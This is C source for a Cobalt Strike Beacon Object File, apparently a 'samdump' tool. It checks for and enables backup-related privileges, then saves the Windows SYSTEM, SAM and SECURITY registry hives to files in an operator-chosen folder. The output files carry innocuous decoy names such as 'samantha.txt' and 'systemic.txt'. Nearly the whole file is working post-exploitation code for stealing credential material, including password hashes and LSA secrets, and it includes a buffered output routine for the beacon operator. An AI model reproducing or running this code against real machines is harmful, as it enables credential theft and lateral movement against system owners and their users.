#include "common.h"

// --------------------------------------------------------------------------
// Buffered output engine (Gpresult/bofout.cpp pattern).
//   bof_out_init()   - allocate the shared buffer
//   bof_printf(...)  - vsnprintf into a stack scratch, append to the buffer
//   bof_flush()      - single BeaconOutput of everything collected
//   bof_out_done()   - free the buffer
// Contract: one BeaconOutput per go() invocation, no BeaconPrintf per hive.
// --------------------------------------------------------------------------
#define BOF_OUTBUFSIZE (64 * 1024)
static char * g_out    = (char*)1;
static int    g_outLen = 1;

static void bof_out_init(void) {
    g_out    = (char*) MSVCRT$calloc(BOF_OUTBUFSIZE, 1);
    g_outLen = 0;
    if (g_out) g_out[0] = '\0';
}

static void bof_flush(void) {
    if (g_out != NULL && g_out != (char*)1 && g_outLen > 0)
        BeaconOutput(CALLBACK_OUTPUT, g_out, g_outLen);
    g_outLen = 0;
    if (g_out != NULL && g_out != (char*)1)
        g_out[0] = '\0';
}

static void bof_out_done(void) {
    if (g_out && g_out != (char*)1)
        MSVCRT$free(g_out);
    g_out    = (char*)1;
    g_outLen = 1;
}

static void bof_printf(const char * fmt, ...) {
    va_list ap;
    char    tmp[2048];
    int     n, remaining, toCopy;
    if (g_out == NULL || g_out == (char*)1) return;
    va_start(ap, fmt);
    n = MSVCRT$vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n <= 0) return;
    if (n >= (int) sizeof(tmp)) n = (int) sizeof(tmp) - 1;
    if (g_outLen + n >= BOF_OUTBUFSIZE) bof_flush();
    remaining = BOF_OUTBUFSIZE - g_outLen - 1;
    toCopy    = (n < remaining) ? n : remaining;
    MSVCRT$memcpy(g_out + g_outLen, tmp, (size_t) toCopy);
    g_outLen += toCopy;
    g_out[g_outLen] = '\0';
}


void EnableDebugPriv( LPCSTR priv )
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tp;


	if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		BeaconPrintf(CALLBACK_ERROR, "[*] OpenProcessToken failed, Error = %d .\n" , KERNEL32$GetLastError() );
		return;
	}

	if (ADVAPI32$LookupPrivilegeValueA( NULL, priv, &luid ) == 0 )
	{
		BeaconPrintf(CALLBACK_ERROR, "[*] LookupPrivilegeValue() failed, Error = %d .\n", KERNEL32$GetLastError() );
		KERNEL32$CloseHandle( hToken );
		return;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
	if (!ADVAPI32$AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof(tp), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL ))
	{
		BeaconPrintf(CALLBACK_ERROR, "[*] AdjustTokenPrivileges() failed, Error = %u\n", KERNEL32$GetLastError() );
		return;
	}

	KERNEL32$CloseHandle( hToken );
}

// Writes progress into the shared heap buffer via bof_printf. The caller
// flushes with a single BeaconOutput(CALLBACK_OUTPUT, ...) at the end.
void ExportRegKey(LPCSTR subkey, LPCSTR outFile)
{
	HKEY hSubKey;
	LPSECURITY_ATTRIBUTES lpSecurityAttributes = NULL;
	if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey,
	        REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK,
	        KEY_ALL_ACCESS, &hSubKey) == ERROR_SUCCESS)
	{
		if (ADVAPI32$RegSaveKeyA(hSubKey, outFile, lpSecurityAttributes) == ERROR_SUCCESS)
		{
			bof_printf("[+] Exported HKLM\\%s -> %s\n", subkey, outFile);
		}
		else
		{
			bof_printf("[-] RegSaveKey failed for HKLM\\%s (Error %u)\n",
			           subkey, KERNEL32$GetLastError());
		}
		ADVAPI32$RegCloseKey(hSubKey);
	}
	else
	{
		bof_printf("[-] RegOpenKeyEx failed for HKLM\\%s (Error %u)\n",
		           subkey, KERNEL32$GetLastError());
	}
}

void go(char * args, int alen)
{
	datap parser;

	char buffer_1[MAX_PATH] = "";
	char *lpStr1;
	lpStr1 = buffer_1;
	
	char buffer_sam[ ] = "samantha.txt";
	char *lpStrsam;
	lpStrsam = buffer_sam;

	char buffer_sys[ ] = "systemic.txt";
	char *lpStrsys;
	lpStrsys = buffer_sys;

	char buffer_sec[ ] = "security.txt";
	char *lpStrsec;
	lpStrsec = buffer_sec;

	// The technique needs SeBackupPrivilege (RegOpenKeyEx REG_OPTION_BACKUP_RESTORE
	// + RegSaveKey), NOT local admin. Backup Operators has SeBackupPrivilege
	// without being local admin, and this BOF should serve that case too.
	// Check the token for the privilege by name and refuse only if it is
	// not present at all. Enabling it below turns it on when it is disabled
	// but held (typical for a fresh token).
	{
		HANDLE hTok = NULL;
		if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
			BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed, Error = %u", KERNEL32$GetLastError());
			return;
		}
		LUID luidBk;
		if (!ADVAPI32$LookupPrivilegeValueA(NULL, SE_BACKUP_NAME, &luidBk)) {
			BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValue(SeBackupPrivilege) failed, Error = %u", KERNEL32$GetLastError());
			KERNEL32$CloseHandle(hTok);
			return;
		}
		// Query the token for its privilege list.
		DWORD needed = 0;
		ADVAPI32$GetTokenInformation(hTok, TokenPrivileges, NULL, 0, &needed);
		PTOKEN_PRIVILEGES tp = (PTOKEN_PRIVILEGES) KERNEL32$LocalAlloc(0, needed);
		if (!tp || !ADVAPI32$GetTokenInformation(hTok, TokenPrivileges, tp, needed, &needed)) {
			BeaconPrintf(CALLBACK_ERROR, "GetTokenInformation failed, Error = %u", KERNEL32$GetLastError());
			if (tp) KERNEL32$LocalFree(tp);
			KERNEL32$CloseHandle(hTok);
			return;
		}
		BOOL hasBackup = FALSE;
		for (DWORD i = 0; i < tp->PrivilegeCount; ++i) {
			if (tp->Privileges[i].Luid.LowPart == luidBk.LowPart &&
			    tp->Privileges[i].Luid.HighPart == luidBk.HighPart) {
				hasBackup = TRUE;
				break;
			}
		}
		KERNEL32$LocalFree(tp);
		KERNEL32$CloseHandle(hTok);
		if (!hasBackup) {
			BeaconPrintf(CALLBACK_ERROR, "SeBackupPrivilege not held (need Backup Operators or admin).");
			return;
		}
	}

	BeaconDataParse(&parser, args, alen); // Parsing arguments from cna
	char * dir;
	dir = BeaconDataExtract(&parser, NULL);

	// Enable the privileges. SeDebugPrivilege is not required for the reg
	// operations below; leave the call for completeness but do not gate on it
	// (Backup Operators does not have it).
	EnableDebugPriv(SE_DEBUG_NAME);
	EnableDebugPriv(SE_RESTORE_NAME);
	EnableDebugPriv(SE_BACKUP_NAME);

	// Single heap buffer for all output, flushed once at the very end.
	// Matches the Gpresult/bofout.cpp contract so the operator sees one
	// "Received Output" block instead of three.
	bof_out_init();
	bof_printf("[*] samdump target folder: %s\n", dir);

	SHLWAPI$PathCombineA(lpStr1, dir, lpStrsys);
	ExportRegKey("SYSTEM", lpStr1);

	SHLWAPI$PathCombineA(lpStr1, dir, lpStrsam);
	ExportRegKey("SAM", lpStr1);

	SHLWAPI$PathCombineA(lpStr1, dir, lpStrsec);
	ExportRegKey("SECURITY", lpStr1);

	bof_flush();
	bof_out_done();
};